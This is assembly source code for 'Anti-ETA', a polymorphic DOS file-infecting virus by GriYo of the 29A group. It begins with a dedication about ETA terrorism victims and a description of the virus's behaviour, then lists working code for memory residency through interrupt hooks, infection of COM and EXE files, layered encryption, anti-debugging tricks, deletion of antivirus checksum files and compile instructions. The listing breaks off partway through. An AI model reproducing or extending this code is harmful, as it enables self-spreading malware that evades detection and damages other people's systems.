;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;          Anti-ETA                                ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;          by GriYo/29A                             ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;                                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
; Introduction
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; This virus is an iniciative of Mister Sandman (writing this right now) and
; GriYo, supported by the rest of the 29Aers and finally written by GriYo.
;
; Espa¤a (Spain in english) is a country that emerged and took its final and
; actual form during  the first years of the XVIth century. It was born from
; the conjunction  of many other  kingdoms/independent countries (ie Arag¢n,
; Catalunya, Galicia, Euskadi, and the most important, Castilla) which lived
; (and fought) together  in the  actual  spanish territory. This final union
; was possible by means of marriages between princes and princesses of these
; kingdoms, pacts, and, of course, wars -which became conquests-.
;
; Today, about four centuries later, a very little minority living in Euska-
; di (right now, one  of  the seventeen  provinces in Spain) claim for their
; independence by means of violence. They don't hesitate on placing bombs in
; big stores, streets, cars, etc. thus causing the death of innocent people,
; or on killing policemen, politicians or anybody who just don't  thinks the
; way they do.
;
; Luckily, many of  these motherfuckers are  arrested and put  in prison far
; away from their home. Anyway, this has also become a problem, as they want
; to stay only in euskadian prisons, in order to  be able to keep in contact
; with  their family. This fact  drove them to, apart from do more killings,
; kidnap an innocent young jailer, called Jos‚ Antonio Ortega Lara.
;
; They didn't ask for money. He was put underground in a very tiny and empty
; room, without any light, without any way  to know when it dawns or when it
; gets dark, with very  few oxygen to breath, with only some food every four
; days, served in the same receptacle where he had to shit and urinate. This
; is... without anything  to do... except of waiting to be freed, and hoping
; that all the psychic tortures he was going submitted to were going to have
; an end some day.
;
; Happily, the spanish police found  and freed  him 532 days later. He had a
; long barb  and 27kg less  of his normal weight. But he eventually was able
; to see  the light  and walk (even talk) again. Today, Jos‚  Ortega Lara is
; still under psychical attention, carrying a normal life again.
;
; However, the reason to be of this virus takes place a few days later, when
; the euskadian violent-independentist  group kidnapped Miguel Angel Blanco,
; a politician from a small  town  called Ermua, and  threatened to kill him
; unless  the spanish goverment would  allow the approaching of the arrested
; terrorists to Euskadi  in a 48-hour deadline. Since  this was made public,
; millions of people went out to the street in order to show their inconfor-
; mity with this cruel way of acting.
;
; Sadly, none  of the mass meetings which  collapsed the  whole Spain for 48
; hours  were enough, and  Miguel Angel Blanco, the  28 year-old politician,
; was eventually  killed by one of  these terrorists by means of two bullets
; shot in his head.
;
; The name of this euskadian  terrorist group is ETA, hence the name of this
; virus, Anti-ETA, offered as a homage to  all the families which  were vic-
; tims of the violent way of acting of these independentists, and especially
; to Jos‚ Antonio Ortega Lara and Miguel Angel Blanco Garrido (RIP).
;
;                                                     29A against terrorism,
;                                                             the 29A staff.
;
;
; Virus behavior
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  Code executed when an infected file is run:
;
;           - Polymorphic decryptor
;           - CPU type check routine
;           - Installation check
;           - COMMAND.COM segment prefix search
;           - Host allocated conventional memory reduction
;           - Conventional memory order for installation
;           - COMMAND.COM segment prefix activation  as current PSP (this
;             context change allows Anti-ETA to perform memory allocation
;             calls without warning a good bunch of TSR watchdogs
;           - Interrupt 22h hooking into host PSP (without modifying IVT)
;           - Control return to host
;
;  Tasks performed by the int 22h handler:
;
;           - Code decryption
;           - Interrupt 3 (breakpoint) vector saving
;           - Interrupt 3 hooking with the virus handler
;           - Interrupt 28h (DOS idle interrupt that  points  to  an iret
;             instruction by default) vector order
;           - First  byte of current int 28h handler storing, instead  of
;             an int 3 instruction
;           - Jump to the original int 22h
;
;             Every time in which COMMAND.COM calls its idle interrupt, a
;             breakpoint instruction gives the control to the interrupt 3
;             handler, owned  by  Anti-ETA. This  handler will  count the
;             number of calls until it  determines that it's safe to hook
;             interrupt 21h. I stole the idea  on using int 28h in such a
;             way  from Rhincewind (see  Catch22  TSR  loader), but  this
;             approach is much more enhanced ;)
;
;  Code executed from the idle interrupt:
;
;           - Another decryption loop performance
;           - First int 28h byte restoring
;           - Interrupt 3 vector restoring
;           - Virus body move to another memory block (including UMBs)
;           - Old memory block release
;           - Interrupt 21h hooking
;
; Encryption
; ÄÄÄÄÄÄÄÄÄÄ
; The main polymorphic decryptor  receives the control when an infected file
; file is executed. On program termination, the virus int 22h handler recei-
; ves the control and decrypts the whole Anti-ETA  body using the  decryptor
; code as key. Another decryptor appears when execution reaches virus' int 3
; handler from the previously redirected idle interrupt.
;
; Infection and  activation routines  are also  encrypted in memory (using a
; random cipher key  each time) and their code will  be decrypted on the fly
; when necessary.
;
;
; Polymorphism
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; Anti-ETA is polymorphic in EXE and COM files, as well as  in the COM files
; it sometimes may drop after having been called function 3bh of int 21h.
;
;
; File infection
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; When any file is executed, Anti-ETA just stores  the file name and infects
; it upon termination, and same for open/close functions.
;
; Every time  the virus  modifies any file, ANTI-VIR.DAT and CHKLIST.MS will
; be deleted (if they exist) in order to avoid getting caught by any kind of
; integrity checker.
;
; While  infecting  files, Anti-ETA  uses  standard  DOS calls, checking for
; errors after each of them and without using any system file table (looking
; for some network compatibility).
;
; The virus tries to  find  the original  int 21h entry point (using the 52h
; function backdoor), and uses it  in  all the file infection routines, thus
; bypassing many TSR watchdogs.
;
; Finally, the int 3 vector  is redirected to the  original  int 21h EP, and
; Anti-ETA uses  an  int 3 instruction  (only 1 byte) when  calling  any DOS
; function for infection.
;
;
; Retro functions
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Checksum files ANTI-VIR.DAT and CHKLIST.MS are deleted from every directo-
; ry where a file is  going to be infected. Apart  from this, the virus con-
; tains some antidebugging code.
;
;
; Activation routines
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; On every call to the int 21h function 3bh (set current directory), the vi-
; rus  will sometimes drop an infected  COM file, with  a random  name and a
; random date/time stamp). Its size  will be also random due to the polymor-
; phic encryption... and... btw, Anti-ETA will not infect its sons, just be-
; cause they're too small ;)
;
; The main payload effect triggers every july 10th (the date in which Miguel
; Angel Blanco  was kidnapped), displaying a graphic that consists on a whi-
; te hand in which reads "Anti-ETA". The white  hand  is the symbol which we
; use in Spain to tell ETA "STOP THE KILLING!".
;
;
; Greetings
; ÄÄÄÄÄÄÄÄÄ
; This time, very special greetings go from the 29A staff to all the victims
; of ETA, hoping this will have an end some day in the future.
;
;
; Compiling it
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; tasm /m anti-eta.asm
; tlink anti-eta.obj


anti_eta        segment
                .386
                assume cs:anti_eta,ds:anti_eta,es:anti_eta,ss:anti_eta
                org 0000h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Some useful equates                                                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

mem_byte_size   equ offset virus_mem_end - offset entry_point
mem_para_size   equ (mem_byte_size+000Fh)/0010h               
inf_byte_size   equ offset virus_inf_end - offset entry_point
inf_para_size   equ (inf_byte_size+000Fh)/0010h
byte_area01h    equ offset end_area01h - offset crypt_area01h
byte_area02h    equ offset end_area02h - offset crypt_area02h
byte_area03h    equ offset end_area03h - offset crypt_area03h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus entry point for all targets (COM and EXE files)                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

entry_point:    push ds                                 ; Save segment regs
                push es
                db 0BDh                                 ; Get delta
delta:          dw 0000h                                ; (mov bp,nnnn)
                push cs                                 ; Point DS to
                pop ds                                  ; our code
                cli                                     ; Check for 386+
                pushf                                   ; CPU
                pop ax                                  
                or ax,2000h                             
                push ax                                 
                popf                                    
                pushf                                   
                pop ax                                  
                sti                                     
                test ax,2000h                           ; Exit if 286
                jz exit_install                         ; or below
                mov esi,"ANTI"
                mov ah,30h                              ; Get DOS version
                int 21h                                 ; and perform
                cmp esi,"ETA!"                          ; installation
                je exit_install                         ; check
                cmp al,05h                              ; MS-DOS 5.0+
                jb exit_install                         ; check

                ; I found a problem using this method of residency
                ; when the virus tries to go resident while a copy
                ; of itself is waiting for enough DOS idle time.
                ;
                ; Fix:
                ;
                ; The virus can check if another copy of itself is
                ; using  the DOS idle interrupt. Just check  for a
                ; breakpoint in the first byte of int 28h.

                mov ax,3528h                            ; Get int 28h
                int 21h                                 ; vector
                cmp byte ptr es:[bx],0CCh               ; int 3?
                je exit_install                         ; Yes, abort
                mov ah,62h                              ; Get and save
                int 21h                                 ; active PSP
                mov es,bx                               ; ES:SI -> host PSP
                xor si,si
                mov dx,bx                               ; Always DW=host PSP
                
                ; A new problem appears when an infected program
                ; executes another file which is also infected.
                ;
                ; Fix:
                ;
                ; Get parent PSP and  check the  name of the MCB
                ; behind. Go resident only if the command inter-
                ; preter is the parent of the infected host.

                mov ax,word ptr es:[si+16h]             ; Get parent PSP
                mov di,ax
                dec ax                                  ; Get parent MCB
                mov es,ax
                cmp dword ptr es:[si+08h],"MMOC"        ; Check name in MCB
                jne exit_install
                mov es,dx                               ; Get host PSP
                mov ah,4Ah                              ; Get free memory
                push ax
                mov bx,0FFFFh                
                int 21h
                pop ax
                sub bx,mem_para_size+01h                ; Sub some memory
                int 21h                                 ; for our code
                jc exit_install
                mov bx,di
                mov ah,50h                              ; Activate command
                int 21h                                 ; PSP
                jc exit_install
                mov ah,48h                              ; Ask for memory
                mov bx,mem_para_size
                int 21h
                mov es,ax                               ; Copy virus to
                call move_virus                         ; allocated memory
                push ds                
                mov ds,dx                               
                xor si,si                               ; DS:SI -> host PSP
                mov eax,dword ptr ds:[si+0Ah]           ; Get int 22h vector,
                mov dword ptr es:[old22h],eax           ; save it and point
                mov word ptr ds:[si+0Ah],offset my22h   ; to our handle
                mov word ptr ds:[si+0Ch],es
                pop ds
                mov bx,dx
                mov ah,50h                              ; Now set host PSP
                int 21h                                 ; as current PSP

exit_install:   mov eax,dword ptr ds:[bp+host_type]
                cmp eax,".COM"                          ; Is it a COM host?
                je exit_com
                cmp eax,".EXE"                          ; An EXE host?
                je exit_exe

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Exit for 1st virus generation                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

exit_launcher:  pop es                                  ; Exit virus launcher
                pop ds                                  ; Restore segment
                mov ax,4C00h                            ; regs and call to
                int 21h                                 ; terminate prog

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Exit from a COM file                                                     ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

exit_com:       mov eax,dword ptr ds:[bp+old_header]    ; Restore first
                mov dword ptr ds:[0100h],eax            ; four bytes
                pop es                                  ; Restore segments
                pop ds
                push cs                                 ; Save return address
                push 0100h
                xor ax,ax                               ; Clear some regs
                mov bx,ax
                mov cx,ax
                mov dx,ax
                mov si,ax
                mov di,ax
                mov bp,ax
                retf

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Exit from an EXE file                                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

exit_exe:       mov ah,62h                              ; Get active PSP
                int 21h
                add bx,0010h                            ; Calculate host CS
                add word ptr ds:[bp+exe_ip_cs+02h],bx
                add bx,word ptr ds:[bp+old_header+0Eh]  ; Calculate host SS
                pop es                                  ; Restore segments
                pop ds
                cli                                     ; Fix program stack
                mov ss,bx
                mov sp,word ptr cs:[bp+old_header+10h]
                sti     
                xor ax,ax                               ; Clear some regs
                mov bx,ax
                mov cx,ax
                mov dx,ax
                mov si,ax
                mov di,ax
                mov bp,ax
                db 0EBh,00h                             ; Clear prefetch
                db 0EAh                                 ; Get control back
exe_ip_cs       dd 00000000h                            ; to host

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Move virus code to another memory location                               ³
;³ On entry:                                                                ³
;³    DS:BP -> current location                                             ³
;³    ES    -> new segment location                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

move_virus:     sub di,di
                mov si,bp
                mov cx,inf_byte_size
                cld
                rep movsb
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Insert/remove breakpoint into/from int 28h handler code (DOS idle)       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

xchg28h:        push di
                push es
                cli
                les di,dword ptr cs:[old28h]            ; Xchg int 28h
                mov al,byte ptr es:[di]                 ; first byte
                xchg al,byte ptr cs:[breakpoint]        ; with out buffer
                stosb
                sti
                pop es
                pop di
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Some code and data out of all the sub-decryptors                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

old03h          dd 00000000h                            ; Int 3 vector
crypt_leave21h: db 0EBh,00h                             ; Clear prefetch
                db 0EAh                                 ; Get control back
old21h          dd 00000000h                            ; to original int 21h
orig21h         dd 00000000h                            ; DOS entry point
crypt_leave22h: db 0EBh,00h                             ; Clear prefetch
                db 0EAh                                 ; Get control back
old22h          dd 00000000h                            ; to original int 22h
old24h          dd 00000000h                            ; Critical error
old28h          dd 00000000h                            ; to original int 28h
breakpoint      db 00h                                  ; Int 28h 1st byte
host_type       dd "CEPA"                               ; File type
crypt_delta     dw 0000h                                ; Delta for decryptor

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Crypt/decrypt area 01h                                                   ³
;³ On entry:                                                                ³
;³    DS    -> area 01h segment to crypt/decrypt                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypto01h:      push bx
                push es
                push ds
                pop es
                mov si,word ptr cs:[crypt_delta]
                add si,offset crypt_area01h
                mov di,si
                mov bx,offset crypto01h
                mov cx,(byte_area01h+01h)/02h
                cld
crypt_loop01h:  lodsw
                push ax
                pop dx
                cli
                mov ax,0002h                            ; Simple stack
                sub sp,ax                               ; verification
                sti
                pop ax
                cmp ax,dx
                jne crypt_loop01h                       ; Fool tracing
                xor ax,word ptr cs:[bx]                 ; Use our code as key
                stosw                                   ; to avoid
                inc bx                                  ; modifications
                cmp bx,offset exit_crypt01h
                jne continue01h
                mov bx,offset crypto01h
continue01h:    loop crypt_loop01h
                pop es
                pop bx
exit_crypt01h:  ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus int 22h handler                                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

my22h:          push cs                                 ; Point DS to
                pop ds                                  ; virus code
                mov word ptr ds:[crypt_delta],0000h     ; Clear delta crypt
                mov eax,dword ptr ds:[host_type]        ; Launcher doesn't
                cmp eax,"CEPA"                          ; need decryption
                je skip_area01h
                call crypto01h                          ; Do decryption
crypt_area01h   equ this byte  
skip_area01h:   db 0EBh,00h                             ; Clear prefetch
                mov al,03h                              ; Save old int 3
                call get_int                            ; vector
                mov word ptr ds:[old03h],bx
                mov word ptr ds:[old03h+02h],es         ; Hook int 3 to
                mov dx,offset my03h                     ; our int 21h
                call set_int                            ; Hooking routine
                mov al,28h                              ; Save int 28h
                call get_int                            ; vector and
                mov word ptr ds:[old28h],bx             ; insert an int 3
                mov word ptr ds:[old28h+02h],es         ; instruction over
                mov byte ptr ds:[breakpoint],0CCh       ; the handler code
                call xchg28h
exit22h:        jmp crypt_leave22h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Crypt/decrypt area 02h                                                   ³
;³ On entry:                                                                ³
;³    DS    -> segment of area 02h to crypt/decrypt                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypto02h:      push es
                push ds
                pop es
                mov si,word ptr cs:[crypt_delta]                
                add si,offset crypt_area02h
                mov di,si
                mov cx,(byte_area02h+02h)/02h
                cld
crypt_loop02h:  lodsw
                xchg ah,al
                stosw
                loop crypt_loop02h
                pop es
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus int 3 handler (called on every int 28h call)                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

my03h:          call push_all                           ; Save all regs
                push cs                                 ; Point DS to
                pop ds                                  ; virus code
                mov eax,dword ptr ds:[host_type]        ; Launcher doesn't
                cmp eax,"CEPA"                          ; need decryption
                je skip_area02h
                call crypto02h                          ; Do decryption
                db 0EBh,00h                             ; Clear prefetch
skip_area02h:   call xchg28h                            ; Remove breakpoint
                mov si,mem_para_size                    ; Allocate memory
                call mem_alloc
                or di,di                                ; Exit if error
                jz cant_move_it                         ; on mem allocation
                push di
                mov es,di                               ; Copy virus to
                sub bp,bp                               ; memory
                call move_virus                         ; Continue execution
                push offset continue_here               ; at newly allocated
                retf                                    ; memory block
continue_here:  mov ah,49h                              ; Free old virus
                push ds                                 ; memory
                pop es
                int 21h
cant_move_it:   mov al,03h                              ; Restore int 3
                lds dx,dword ptr cs:[old03h]            
                call set_int
                push cs
                pop ds
                mov ax,3521h                            ; Get and save
                int 21h                                 ; current int 21h
                mov word ptr ds:[old21h],bx
                mov word ptr ds:[old21h+02h],es
                mov word ptr ds:[orig21h],bx
                mov word ptr ds:[orig21h+02h],es
                mov ah,52h                              ; Use this backdoor
                int 21h                                 ; to get int 21h
                mov bx,109Eh                            ; kernel entry point
                cmp word ptr es:[bx],9090h
                jne no_backdoor 
                cmp byte ptr es:[bx+02h],0E8h
                jne no_backdoor 
                cmp word ptr es:[bx+05h],0FF2Eh
                jne no_backdoor 
                mov word ptr ds:[orig21h],bx
                mov word ptr ds:[orig21h+02h],es
                
                ; Function 52h (get ptr to dos info block) returns
                ; in ES the segment of the DOS entry point. Offset
                ; seems to be always 109eh in lots of machines.
                ;
                ; Anti-ETA will check if the code looks like:
                ;
                ;    nop                      -> 90h
                ;    nop                      -> 90h
                ;    call xxxx                -> E8h xx xx
                ;    jmp  dword ptr cs:[yyyy] -> 2Eh FFh 2Eh yy yy

no_backdoor:    mov eax,dword ptr ds:[host_type]        ; Launcher needs
                cmp eax,"CEPA"                          ; encryption
                jne skip_area03h
                call crypto03h
skip_area03h:   mov ax,2521h                            ; Point int 21h
                mov dx,offset my21h                     ; to our handler
                int 21h
exit03h:        call pop_all                            ; Restore saved regs
                pushf
                call dword ptr cs:[old28h]
                cli                                     ; Fix stack
                add sp,0006h                            ; and return to
                sti                                     ; int 28h caller
                iret
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Do encryption over area 03h (int 21h code)                               ³
;³ On entry:                                                                ³
;³    DS    -> segment of area 03h to crypt/decrypt                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_area02h   equ this byte
crypto03h:      db 0EBh,00h                             ; Clear prefetch
                push si                                 ; Save some
                push di                                 ; regs and
                push es                                 ; perform
short_way:      push ds                                 ; encryption
                pop es                                  ; using add
                mov si,word ptr cs:[crypt_delta]        ; instruction
                add si,offset crypt_area03h
                mov di,si
                mov cx,(byte_area03h+01h)/02h
                cld
                db 0EBh,00h                             ; Clear prefetch
crypt_loop03h:  lodsw
                db 05h                                  ; add ax,xxxx
crypt21h_key    dw 029Ah                        
                stosw
                loop crypt_loop03h
                pop es
                pop di
                pop si
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Decrypt virus int 21h code if needed                                     ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

rm_crypt21h:    mov ax,cs                               ; Remove int 21h
                mov ds,ax                               ; encryption
                mov es,ax                               ; using sub
                mov si,offset crypt_area03h             ; instruction
                mov di,si
                mov cx,(byte_area03h+01h)/02h
                cld
                db 0EBh,00h                             ; Clear prefetch
clear21h:       lodsw
                db 2Dh                                  ; sub ax,xxxx
decrypt21h_key  dw 029Ah                          
                stosw
                loop clear21h
                call rand_16
                mov word ptr ds:[crypt21h_key],ax       ; Get random key
                mov word ptr ds:[decrypt21h_key],ax
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus int 21h handler                                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

my21h:          cmp ah,30h                              ; Install check?
                je install_check
                cmp ah,3Bh                              ; Change directory
                jne try_get_name
                call push_all                           ; Save all regs
                call rm_crypt21h                        ; Remove encryption
                jmp try_activation
try_get_name:   cmp ax,4B00h                            ; Execution?
                je work_filename
                cmp ah,3Dh                              ; Open?
                je work_filename
                cmp ah,6Ch                              ; Extended open?
                jne try_infection
work_filename:  call push_all                           ; Save all regs
                call rm_crypt21h                        ; Remove encryption
                call pop_all                            ; Restore regs
                call push_all                           ; and save them again
                jmp store_filename                      ; Copy filename
try_infection:  cmp ax,4C00h                            ; Terminate?
                je work_infection
                cmp ah,3Eh
                jne forget_this
work_infection: call push_all                           ; Save all regs
                call rm_crypt21h                        ; Remove encryption
                call pop_all                            ; Restore regs
                call push_all                           ; and save them again
                jmp infect_program
forget_this:    jmp crypt_leave21h
exit21h:        push cs                                 ; Redo encryption
                pop ds                                  ; before leaving
                call crypto03h                          
                call pop_all                            ; Restore regs
                jmp crypt_leave21h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Perform a call to the original int 21h vector                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

call21h:        pushf                                   ; Perform a call to
                call dword ptr cs:[orig21h]             ; the interrupt 21h
                retf 02h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Installation check                                                       ³
